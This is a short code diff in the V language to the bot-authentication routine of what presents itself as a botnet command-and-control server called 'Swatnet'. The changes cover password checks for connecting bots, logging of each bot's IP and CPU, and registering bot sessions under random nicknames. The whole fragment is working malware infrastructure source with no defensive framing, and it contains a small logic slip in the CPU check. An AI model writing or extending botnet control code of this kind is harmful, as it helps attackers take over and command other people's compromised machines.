@@ -53,20 +53,24 @@ pub fn (mut b Bot_CNC) listener(port string, mut s cnc.Swatnet) {
 pub fn (mut b Bot_CNC) bot_auth(mut bot_conn net.TcpConn, mut s cnc.Swatnet) {
 	mut reader := io.new_buffered_reader(reader: bot_conn)
 	hid_pw := reader.read_line() or { "" }
-
-	if hid_pw != s.bot_pw {
+	
+	if hid_pw.replace("\n", "") != s.bot_pw {
+		bot_conn.write_string("[x]\n") or { 0 }
 		println("[x] Error, Bot access denied. Invalid password provided....!")
 		bot_conn.close() or { return }
 		return
 	}
 
+	println("[ + ] Bot Authorized")
+
 	cpu := reader.read_line() or { "" }
 	if cpu == "" {
+		println("[ + ] Bot CPU: ${cpu}")
 		bot_conn.close() or { return }
 	}
 	user_addy := bot_conn.peer_addr() or { return }
 	user_ip := "${user_addy}".split("]:")[0].replace("[::ffff:", "")
-	println("Bot successfully connected.....!")
+	println("Bot [${user_ip}] successfully connected.....!")
 	b.add_bot_session(b.randomize_nick(), mut bot_conn, cpu, user_ip, "")
 }
 
